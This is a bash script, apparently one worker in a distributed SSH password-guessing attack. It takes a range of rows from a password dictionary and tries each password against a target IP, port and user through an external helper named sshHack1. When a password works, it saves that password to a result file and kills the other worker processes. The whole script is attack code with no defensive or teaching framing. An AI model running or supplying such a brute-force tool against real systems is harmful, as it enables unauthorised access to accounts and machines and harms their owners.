#!/bin/bash

if [ $# != 3 ]; then
  echo "Usage: $cmdname [node index] [start row] [end row]"
  exit 99
fi
nodeindex=$1
start=$2
end=$3
cmdname=`basename $0`
counterfile=$basepath/counterfile_$nodeindex

echo "0" > $counterfile
for pwd in `sed -n "${start},${end}p" $dicfile`; do
  echo `expr $(cat $counterfile) + 1` > $counterfile
  $sshHack1 $ip $port $user $pwd
  #if [ $nodeindex = 0 ]; then
  if [ $? = 0 ]; then
    echo $pwd > $resultfile
    echo "success!"
    for pid in `ps -aef | grep $cmdname | awk '{ print $2 }'`; do
      if [ $pid != $$ ]; then
        kill $pid
      fi
    done
    exit
  fi
done

